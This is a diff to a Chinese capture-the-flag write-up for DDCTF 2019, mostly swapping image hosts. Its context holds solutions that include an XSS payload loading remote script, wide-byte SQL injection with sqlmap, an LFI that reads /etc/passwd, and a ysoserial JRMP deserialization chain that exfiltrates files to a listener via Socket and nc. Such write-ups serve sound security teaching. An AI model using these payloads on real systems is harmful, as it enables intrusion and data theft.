@@ -1,5 +1,5 @@
 # 2019DDCTF滴滴高校闯关赛
-本题已开通评论，欢迎在页面最下方留言吐槽。<img src="https://cloud.panjunwen.com/alu/呲牙.png" alt="呲牙.png" class="vemoticon-img">
+本题已开通评论，欢迎在页面最下方留言吐槽。<img src="https://ctfwp.wetolink.com/alu/呲牙.png" alt="呲牙.png" class="vemoticon-img">
 ## 题目类型：
 |类型|年份|难度|
 |:---:|:---:|:---:|
@@ -47,7 +47,7 @@ http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09
 将`index.php`其转换成HEX，再两次转Base64得：  
 `TmprMlpUWTBOalUzT0RKbE56QTJPRGN3`  
 替换原来的jpg值访问：  
-![](https://i.loli.net/2019/04/18/5cb774ca39bc4.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/0.png)  
 红框部分即为index.php的base64编码过的内容，复制下来解码得：  
 ```
 <?php
@@ -80,13 +80,13 @@ echo "<img src='data:image/gif;base64,".$txt."'></img>";
 
 题目提示了一个url，还有一个日期(2018-7-4)。
 打开提示文章，发现该文章发表时间与提示时间不同。  
-![](https://i.loli.net/2019/04/18/5cb774ca9a9a4.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/1.png)  
 打开作者首页，找到2018-7-4发表的文章：  
 https://blog.csdn.net/FengBanLiuYun/article/details/80913909  
-这里有个巨大脑洞！！写这题的时候真想杀了出题人<img src="https://cloud.panjunwen.com/alu/中刀.png" alt="中刀.png" class="vemoticon-img">  
-![](https://i.loli.net/2019/04/18/5cb774cab88a1.png)  
+这里有个巨大脑洞！！写这题的时候真想杀了出题人<img src="https://ctfwp.wetolink.com/alu/中刀.png" alt="中刀.png" class="vemoticon-img">  
+![](https://ctfwp.wetolink.com/2019ddctf/2.png)  
 猜测存在备份文件`practice.txt.swp`，访问之~:  
-![](https://i.loli.net/2019/04/18/5cb774ca2f3a1.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/3.png)  
 提示flag存在于`f1ag!ddctf.php`文件，使用index.php读取之~  
 由于`$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);`，我们无法直接输入!  
 不过由于`$file = str_replace("config","!", $file);`，我们可以使用config来代替。  
@@ -115,11 +115,11 @@ if(isset($uid))
 简单的变量覆盖题，`extract($_GET);`会将GET内容转换成变量。  
 `file_get_contents($k)`使用php://input将会返回post的数据  
 getflag:  
-![](https://i.loli.net/2019/04/18/5cb774ca7880a.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/4.png)  
 flag: `DDCTF{436f6e6772617******174696f6e73}`
 ### Web签到题
 打开题目，提示不是管理员权限，观察请求header，发现字段：didictf_username的值为空  
-![](https://i.loli.net/2019/04/18/5cb774ca7ac7e.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/5.png)  
 burp拦截数据包修改为admin，返回内容：  
 `您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php`  
 访问app/fL2XID2i0Cdh.php得源码：
@@ -304,10 +304,10 @@ $ddctf->index();
 我们注意到此处函数涉及到key值的操作，其中sprintf为占位符替换函数。  
 如果我们post的nickname值里存在%s 那么key值也会随着输出。  
 先获得cookie值，记得header头加上`didictf_username: admin`  
-![](https://i.loli.net/2019/04/18/5cb774ca8eb5c.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/6.png)  
 将cookie替换，post内容:`nickname=a---%s`  
 得到key:`EzblrbNS`，至此大工告成。  
-![](https://i.loli.net/2019/04/18/5cb774ca92d3c.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/7.png)  
 理清下思路：  
 + 1.新建Application类，修改path变量为`..././config/flag.txt`(../进行过一次过滤)  
 + 2.将类加入$userdata数组进行序列化处理
@@ -485,7 +485,7 @@ print(hashlib.md5(str.encode('utf8')).hexdigest())
 ```
 得到hash:`3c27da16d59c7edbacbf41a5cea391c3`  
 修改数据包重放：  
-![](https://i.loli.net/2019/04/18/5cb774ca91cf1.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/8.png)  
 记得先url编码哟~  
 flag: `DCTF{ddctf2019_*****_pHVlHIDDGdV8qA2j}`
 
@@ -496,26 +496,26 @@ flag: `DCTF{ddctf2019_*****_pHVlHIDDGdV8qA2j}`
 
 步骤：
 1、用上面给出的用户名密码打开靶机，发现是这么一个页面。  
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/15553723500cc490e43a116c274bc5557f733d0869-1024x323.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/9.png)  
 2、那么就传一个图片上去试试吧。  
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/155537260287d2e92e09b23c9abb99ce89ba1ac2e8.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/10.png)  
 3、上传之后，发现提示 “[Check Error]上传的图片源代码中未包含指定字符串:phpinfo()”，并且还返回了上传之后图片的地址。  
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555372708745cdb732452923fbf7c4c327973f0e8-1024x413.png)  
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/155537272304aa21341ba770893c94b55cb16072c9-1024x105.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/11.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/12.png)  
 4、那么我们就把我们上传之后的图片下载回来看看吧。下载之后用 hex 编辑器打开。发现开头这儿指明了其是 php-gd 带着 libjpeg 转换的。  
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/15553729738ada50c267bdc84bc2acc4aa7026b147.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/13.png)  
 5、比较一下原图片和现在的图片，似乎有很多不同。  
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555373208b5c3313e5967c99508c1f8b44d06ebc0-1024x891.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/14.png)  
 6、那么我们把下载下来的图片再传回去呢？  
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/155537332599e8f433b70e3f521e5a91d6a3c3a897.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/15.png)  
 7、啊哈，这一把前面倒是蛮多相同的地方了。  
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555373422ba1bed458a8c194a4c09254dc4a248d2-1010x1024.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/16.png)  
 8、那么我们就往里面相同的部分替换 “phpinfo()” (9字节)试试。  
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/15553736390904ad879af481c53e3099d0b81db514.png)  
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/155537367339d3a21fa09eaddb5277ea7c0edc8125-1024x422.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/17.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/18.png)  
 9、不断 fuzz 插入的位置，发现插入这里可以。  
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555373819fe1bbd046af53863385ecf0163df88cd.png)  
-![](https://www.zhaoj.in/wp-content/uploads/2019/04/1555373851148738e582fecd7b4595f072da4b1c71-1024x374.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/19.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/20.png)  
 10、Flag 到手~
 
 ### 大吉大利，今晚吃鸡~
@@ -673,10 +673,10 @@ root用户的mysql操作一般记录在：`~/.mysql_history`中，读取一下�
 一直以为是sql，直到用xss的exp发现有bot请求  
 在报名页面的备注里只对sql进行一点过滤，但是xss没有任何过滤，直接`<script src=//xxxx></script>`即可  
 通过xss平台读页面源码读到一个接口  
-![](https://xzfile.aliyuncs.com/media/upload/picture/20190419111202-e6ca6fe6-6250-1.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/27.png)  
 `http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=`
 测了半天注入还是没东西，结果一堆人做出来后重新复测，注意到返回头GBK  
-![](https://xzfile.aliyuncs.com/media/upload/picture/20190419111216-ef4871e0-6250-1.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/28.png)  
 然后就是宽字节注入  
 SQLmap加tamper都可以跑  
 ```
@@ -696,7 +696,7 @@ sql-shell> select ctf_value from ctfdb.ctf_fhmHRPL5;
 常规操作，注库名，表名，字段名（TCL）做的时候想的太复杂了，但是我的sqlmap最后这里不能直接--dump，所以我执行了--sql-shell自定义sql命令最终拿的flag  
 sqlmap宽字节注入自带的tamper是`unmagicquotes`  
 这里因为过滤了单引号，所以我们需要用--hex参数将字符串转为0x开头的16进制数字避开引号  
-![](https://xzfile.aliyuncs.com/media/upload/picture/20190419111259-094dde36-6251-1.png)
+![](https://ctfwp.wetolink.com/2019ddctf/29.png)
 
 ### 再来1杯Java
 作者：**5am3**  
@@ -714,25 +714,25 @@ p.s.压轴题哈，说实话，这题真的学会了不少东西。毕竟自己�
 一顿操作猛如虎，最后只读出/etc/passwd...  
 
 搜到了[很多字典](https://github.com/tdifg/payloads/blob/master/lfi.txt)。然后burp爆破一波，最后发现/proc/self/fd/15这里有东西，看到熟悉的pk头，情不自禁的笑了起来。（对，就是源码）  
-![](https://xzfile.aliyuncs.com/media/upload/picture/20190419014936-54f65eac-6202-1.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/30.png)  
 源码也不多，很容易，可以看到一个反序列化的接口。  
-![](https://xzfile.aliyuncs.com/media/upload/picture/20190419014936-5527d2de-6202-1.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/31.png)  
 在反序列化之前，还调用了SerialKiller，作为一个waf，对常见payload进行拦截。  
 首先题目给了hint：JRMP。根据这个hint，我们可以找到很多资料。在这里自己用的ysoserial，根据他的JRMP模块来进行下一步操作。  
 在这里，JRMP主要起了一个绕过waf的功能，因为这个waf只在反序列化userinfo时进行了调用。当通过JRMP来读取payload进行反序列化时，不会走waf。  
 首先，JRMP这个payload被waf掉了，我们可以采用先知上的一种绕过方式。  
 >https://xz.aliyun.com/t/2479
 
-![](https://xzfile.aliyuncs.com/media/upload/picture/20190419014937-5555b226-6202-1.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/32.png)  
 直接修改ysoserial源码即可，将原有的JRMPClient的payload复制一份，改名为JRMPClient2，然后保存并编译。  
 此时我们可以尝试使用URLDNS模块，来判断是否攻击成功。  
-修改替换{{内容}}  
+修改替换{\{内容}}  
 开启监听端口  
 建议采用ceye的dnslog查看  
-`java -cp ./ysoserial-5am3.jar ysoserial.exploit.JRMPListener {{port}} URLDNS {{http://eval.com}}`  
+`java -cp ./ysoserial-5am3.jar ysoserial.exploit.JRMPListener {\{port}} URLDNS {\{http://eval.com}}`  
 生成链接JRMPListener的payload  
 ip端口那里填写运行第4行脚本的主机地址端口  
-`java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8119}} | base64`  
+`java -jar ./ysoserial-5am3.jar JRMPClient2 {\{10.0.0.1:8119}} | base64`  
 此时将第10行生成的代码，直接打到远程即可。  
 然后查看dnslog信息。发现存在，那就是ok了。  
 接下来可以尝试换payload了。此时这里还存在一个问题。服务器端无法执行命令！！  
@@ -789,7 +789,7 @@ public static <T> T createTemplatesImpl ( final String command, Class<T> tplClas
 ```
 此时，我们的payload已经可以支持代码执行了。  
 在这里，我是直接用本地的题目环境进行调试，尝试打印了aaa,操作如下。  
-修改替换{{内容}}  
+修改替换{\{内容}}  
 开启监听端口  
 建议采用ceye的dnslog查看  
 执行时合并为一行，为了好看，我换了下行  
@@ -799,7 +799,7 @@ java -cp ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099
 ```
 生成链接JRMPListener的payload  
 ip端口那里填写运行第4行脚本的主机地址端口  
-`java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8099}} | base64`  
+`java -jar ./ysoserial-5am3.jar JRMPClient2 {\{10.0.0.1:8099}} | base64`  
 
 此时将第10行生成的代码，直接打到远程即可。  
 然后进而写一下获取文件，以及获取目录的代码。此时拿到文件，无法回显。我们可以用Socket来将文件发送到我们的服务器，然后nc监听端口即可。  
@@ -830,36 +830,36 @@ in.close();
 s.close();
 ```
 然后操作如下：  
-修改替换{{内容}}  
+修改替换{\{内容}}  
 开启监听端口  
 建议采用ceye的dnslog查看  
 执行时合并为一行，为了好看，我换了下行  
 ```
 java -cp ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 
-    CommonsBeanutils1 'code:{{javapayload}}'
+    CommonsBeanutils1 'code:{\{javapayload}}'
 ```
 #生成链接JRMPListener的payload  
 ip端口那里填写运行第4行脚本的主机地址端口  
-`java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8099}} | base64`  
+`java -jar ./ysoserial-5am3.jar JRMPClient2 {\{10.0.0.1:8099}} | base64`  
 监听端口数据
 >nc -lnvp 2333
 
 此时将第10行生成的代码，直接打到远程即可。
-![](https://xzfile.aliyuncs.com/media/upload/picture/20190419014937-556bf6f8-6202-1.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/33.png)  
 p.s. /flag是个文件夹
 
 ## Reverse
 **作者：admin-琴里、impakho**
 ### Cofused
-![](https://i.loli.net/2019/04/18/5cb8331aa6140.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/34.png)  
 这个文件下载下来是app的安装包  
 然后再安装包里发现了一个叫xia0Crackme文件  
-![](https://i.loli.net/2019/04/18/5cb833314bf25.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/35.png)  
 然后我们拖到IDA里面  
 查找字符串  
-![](https://i.loli.net/2019/04/18/5cb8335ad772a.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/36.png)  
 交叉引用来到关键函数  
-![](https://i.loli.net/2019/04/18/5cb8337af011c.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/37.png)  
 函数都标有注释（震惊！出题人果然是一个良好的大佬）  
 程序验证了前六位是不是”DDCTF{“  
 以是不是”}”  
@@ -868,36 +868,36 @@ p.s. /flag是个文件夹
 这个flag则正确  
 
 然后sub_1000011D0函数中首先是初始化了一个区域：v2  
-![](https://i.loli.net/2019/04/18/5cb833aadf7a9.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/38.png)  
 Sub_100001f60是通过输入的字符串和内存数据对v2进行赋值操作  
-![](https://i.loli.net/2019/04/18/5cb833c452fe9.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/39.png)  
 前段是对v2进行赋值，最后将输入的字符串拷贝到qword_100003F58+48的位置  
 
 
 sub_100001F00函数对(*v2+24)进行赋值把一段数据赋给了他，然后是一个循环判断条件就是刚刚赋值的数据是不是等于“0xf3”
 然后我们进入sub_100001E50这个函数是控制程序执行的vm的分支  
 
-![](https://i.loli.net/2019/04/18/5cb833ffb2006.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/40.png)  
 跳转的分支就是刚刚给v2赋值的函数地址  
 
 sub_100001D70：相当于给一个寄存器赋值的操作  
-![](https://i.loli.net/2019/04/18/5cb83428a538d.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/41.png)  
 然后sub_100001A60：异或操作  
-![](https://i.loli.net/2019/04/18/5cb83500730e3.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/42.png)  
 ub_100001AA0：对操作后的字符和输入的字符进行比较  
 sub_100001CB0：加操作  
-![](https://i.loli.net/2019/04/18/5cb83428a538d.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/41.png)  
 sub_100001CF0：减操作  
-![](https://i.loli.net/2019/04/18/5cb8356e0f8f1.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/44.png)  
 sub_100001B10:设置判断是否正确标志位  
-![](https://i.loli.net/2019/04/18/5cb8356e20d1e.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/45.png)  
 sub_100001D30：赋值操作  
-![](https://i.loli.net/2019/04/18/5cb8356e21a8d.png)
+![](https://ctfwp.wetolink.com/2019ddctf/46.png)
 
 sub_100001C60：对内存中的数据进行操作  
-![](https://i.loli.net/2019/04/18/5cb8356e2209f.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/47.png)  
 两种运算:`A～Z`和`a～z`  
-![](https://i.loli.net/2019/04/18/5cb8356e2b276.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/48.png)  
 具体数据：  
 ```
 0xf0,0x10,0x66,0x0,0x0,0x0,
@@ -1000,14 +1000,14 @@ sub_100001C60：对内存中的数据进行操作
 ### Reverse 2
 作者：**impakho**  
 查壳，显示 ASPack ，用工具脱壳。上 IDA 分析。  
-![](https://impakho.com/images/6368c5b9e8780b87fffb0d505ff89a82.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/49.png)  
 sub_11D11F0 函数判断输入的字符串是否在 0-9,A-F 的范围内，并且长度是否为偶数。  
-![](https://impakho.com/images/221384786587208c4feccd99dbc6be07.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/50.png)  
 sub_11D1240 函数是一个 hex2bin 的转换。  
-![](https://impakho.com/images/907ab35fe1058a7624eff9e49bc6380e.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/51.png)  
 sub_11D1000 函数是一个 base64 编码的过程，编码结果再异或 0x76。  
 编码表为 byte_11D3020。  
-![](https://impakho.com/images/604efddc509e81b70aabbdfc24b9070a.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/52.png)  
 
 贴上解密脚本：
 ```
@@ -1030,7 +1030,7 @@ for i in range(2):
     flag+=chr(((b<<4)&0xff)|(c>>2))
     flag+=chr(((c<<6)&0xff)|d)
 flag=flag.encode('hex').upper()
-print 'DDCTF{%s}' % flag
+print 'DDCTF{\%s}' % flag
 ```
 Flag: `DDCTF{AD******C7BE}`
 
@@ -1039,21 +1039,21 @@ Flag: `DDCTF{AD******C7BE}`
 ### wireshark
 我们得到流量包，分析流量包并未发现敏感信息。 。。  
 然后，就试着导出文件 得到：  
-![](https://i.loli.net/2019/04/19/5cb918c6110fe.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/53.png)  
 并未有任何发现。。 然后，就试着再次分析流浪包。 在追踪流时发现多个图片。  
-![](https://i.loli.net/2019/04/19/5cb918c673d0b.png)  
-![](https://i.loli.net/2019/04/19/5cb918c67370d.png)  
-![](https://i.loli.net/2019/04/19/5cb918c6818fc.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/54.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/55.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/56.png)  
 又发现了一个解密网站。。。  
-![](https://i.loli.net/2019/04/19/5cb918c664be1.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/57.png)  
 把图片手动导出。。。 （16进制工具） 得到：  
-![](https://i.loli.net/2019/04/19/5cb918c66ab77.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/58.png)  
 发现了钥匙。。。  
 然后就是获得key  
 发现图片钥匙头朝下。。。   
 猜测可能隐藏高度：  
 把高度改为07 50，得到key  
-![](https://i.loli.net/2019/04/19/5cb918c66b135.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/59.png)  
 key:57pmYyWt  
 然后在线解密就得到flag了。
 
@@ -1169,11 +1169,11 @@ flag：
 提示2：密钥不足位用\0补全
 提示3：不要光记得隐写不看图片本身啊...
 
-![](https://impakho.com/images/49be6616ba0a32684d6dc71b1a20bec8.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/60.png)  
 根据题目提示，查隐写，在 LSB 里找到一串 base64 编码的字符串，应该是 AES 的密文。  
-![](https://impakho.com/images/f0622488ab8ec745dc68568fe54c0905.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/61.png)  
 进一步根据 Color Threshold 提示，用 PhotoShop 调整图片的阀值，找到 北京地铁线路图 上某一站点的颜色不一样，这个站点的 小写拼音字母 为加密密钥。  
-![](https://impakho.com/images/39a3fb90b4177c0095d3c0c283a26916.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/62.png)  
 ```
 from Crypto.Cipher import AES
 from base64 import *
@@ -1331,24 +1331,24 @@ e(源码的sr)=30000时就可以得到较为清晰的原音频。除此以外，
 ## PWN
 作者：**admin-琴里**
 ### Strike
-![](https://i.loli.net/2019/04/19/5cb91b427896f.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/63.png)  
 首先，我们读一下整个程序  
-![](https://i.loli.net/2019/04/19/5cb91b42e7842.jpg)  
+![](https://ctfwp.wetolink.com/2019ddctf/64.jpeg)  
 我们可以看到这里buf可以输入0x40个字节  
-![](https://i.loli.net/2019/04/19/5cb91b42c2206.jpg)  
+![](https://ctfwp.wetolink.com/2019ddctf/65.jpeg)  
 查看安全检查，没有canary  
 后面通过调试这里输入可以泄露  
-![](https://i.loli.net/2019/04/19/5cb91b42b7893.jpg)  
-![](https://i.loli.net/2019/04/19/5cb91b42c777c.jpg)  
+![](https://ctfwp.wetolink.com/2019ddctf/66.jpeg)  
+![](https://ctfwp.wetolink.com/2019ddctf/67.jpeg)  
 下面输入password  
 可以看到这里signed 变成了unsigned  
 这里的话 就是一个整形溢出漏洞  
-![](https://i.loli.net/2019/04/19/5cb91b42bcde3.jpg)  
-![](https://i.loli.net/2019/04/19/5cb91b42bb492.jpg)  
+![](https://ctfwp.wetolink.com/2019ddctf/68.jpeg)  
+![](https://ctfwp.wetolink.com/2019ddctf/69.jpeg)  
 然后，我们就可以进行栈溢出攻击  
 我们通过第一步泄露libc地址  
 在进行第二部攻击的时候  
-![](https://i.loli.net/2019/04/19/5cb91b42d3a7a.jpg)  
+![](https://ctfwp.wetolink.com/2019ddctf/70.jpeg)  
 发现这里最后的指令是会困住你的  
 lea esp,[ecx-4]  
 改变了栈地址  
@@ -1361,7 +1361,7 @@ retn的时候要注意
 然后通过第二部的栈溢出  
 构造返回为one_gadget  
 就直接shel  
-![](https://i.loli.net/2019/04/19/5cb91b42f02be.jpg)  
+![](https://ctfwp.wetolink.com/2019ddctf/71.jpeg)  
 然后我们就能拿到flag  
 
 ## Android
@@ -1377,7 +1377,7 @@ Java_com_didictf_guesskey2019lorenz_MainActivity_stringFromJNI(int a1);
 结合动态调试，分析出输入要以 `ddctf-android-lorenz-` 开头，里面会去除这个开头，然后判断剩下的字符串是否在 A-Z,1-6 范围内，然后拿去做 `Lorenz Encrypt`，最后加密结果做 5轮sha256 计算，比较结果是否与设定值相同。  
 LEM 初始化时会设置 `Pinsettings`，也就是轮子的初始值，然后每次转轮生成固定的密钥，有点像 `srand` 和 `rand` 产生伪随机数的过程。然后用户输入还经过 `TelePrinter` 的 `Baudot` 编码转换。生成的密钥与用户输入进行 xor 处理。完成一次加密需要进行 10轮 这个步骤。  
 根据题目提示，需要交给 LEM 做加密的字符串为 ZFXXXXXX（X 代表的字符在 A-Z,1-6 范围内）。  
-![](https://impakho.com/images/bf6f246c1f64526199ef711cbf883972.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/72.png)  
 为了省事，在此处下断点读 v4，读 8*10=80 次，把需要用到的密钥读出来。  
 已知明文前面两字节为 ZF，需要爆破后面6字节。  
 写出爆破脚本如下：  
@@ -1443,15 +1443,15 @@ Flag: `DDCTF{ddctf-android-******-ZFPQETDB}`
 
 尝试动态调试，直接闪退，`logcat` 显示 `loadlibrary` 时抛出 `has invalid shdr offset/size` 错误。上网查了一下，发现 Android >= 7 时开启了诸多对 .so 文件的检测。而这道题的 .so 头部被修改过，所以过不了这个检测。  
 先对 `libhwFGfOp0EzktJb.so` 进行分析。  
-![](https://impakho.com/images/ae065d71edccda0aa10d91a4721423f4.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/73.png)  
 此处会判断输入长度是否为14字节。  
-![](https://impakho.com/images/56f81938495f6afec55be9ddbd376e9d.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/74.png)  
 然后与 `off_2910` 进行比较。
 ```
 off_2910 = @n|ixihPIppqws
 ```
 再分析一下 smali 代码。发现它会调用到一个外部 dex 文件：`assets/Y2xhc3Nlc19kZC5kZXg=`。
-![](https://impakho.com/images/cc8b28875d30c8e630e14a6a7fe481bc.png)
+![](https://ctfwp.wetolink.com/2019ddctf/75.png)
 这里会对用户输入进行 Encode，然后再交由 .so 进行比较。  
 写解密脚本，发现提交答案始终不正确。在这里卡了一段时间，后来重新审计 smali 代码，发现自己还是太年轻了，没玩懂出题人的套路。  
 里面有段代码会动态修改外部 dex 文件，往里面插入一些代码，重新计算头部的校验值，并且生成一个新的 dex 文件，释放到 `/sdcard/` 里的一个隐藏文件夹里。新文件名为 `dnsmanYUn12M.dex`，这个才是真正被调用到的 dex 文件。没理解错的话，整个流程用术语好像是叫作 热修复？  
@@ -1460,7 +1460,7 @@ off_2910 = @n|ixihPIppqws
 由于 .so 被修改了头，直接运行 APK 会闪退，所以注释掉 `smali` 里 `loadlibrary` 这一行，重新打包 APK，这样就能不会闪退了。然后点击 Check 的按钮，让它生成新的 dex 文件，并且由于没有 `loadlibrary` 无法调用外部函数，触发闪退。  
 这样就能从隐藏文件夹里提取出新的 `dnsmanYUn12M.vdex` 和 `dnsmanYUn12M.odex `文件。  
 然后手工转成 `dnsmanYUn12M.dex` 文件，进一步分析。  
-![](https://impakho.com/images/da20237eb094e87f36c3a0f68809e9f2.png)  
+![](https://ctfwp.wetolink.com/2019ddctf/76.png)  
 这才是真正的 dex 文件。套路真的深～  
 写解密脚本，一个很简单的解密流程。  
 ```
@@ -1477,7 +1477,7 @@ Flag: `DDCTF{Hg******_Yabbcf}`
 
 # 评论区
 **请文明评论，禁止广告**
-<img src="https://cloud.panjunwen.com/alu/扇耳光.png" alt="扇耳光.png" class="vemoticon-img">  
+<img src="https://ctfwp.wetolink.com/alu/扇耳光.png" alt="扇耳光.png" class="vemoticon-img">  
 
 ---
 
